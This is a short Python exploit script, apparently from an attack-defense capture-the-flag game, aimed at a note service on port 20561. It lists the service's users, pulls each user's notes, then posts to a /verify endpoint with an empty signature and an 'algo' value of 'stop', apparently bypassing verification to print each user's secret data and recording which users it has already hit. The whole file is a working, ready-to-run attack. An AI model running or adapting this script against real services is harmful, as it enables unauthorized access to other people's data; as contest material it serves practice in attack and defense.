#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re,json
from storage import storage_set, storage_get

#ip = sys.argv[1]
ip = sys.argv[1] + ':20561'

s = requests.Session()

html = s.get('http://{}/get_users'.format(ip), timeout=(None,None))
users = html.json()

for user in users["users"]:
    if not storage_get(ip + ':' + user):
        html = s.get('http://{}/get_notes'.format(ip), params={'login': user, 'algo': 'stop'}, timeout=(None,None))
        note = html.json()
        try:
            html = s.post('http://{}/verify'.format(ip),
                          data={'login': user, 'h': note['notes'][0], 's': '', 'algo': 'stop'}, timeout=(None,None))
            print(html.json()['data'], flush=True)
        except:
            pass
        storage_set(ip + ':' + user)
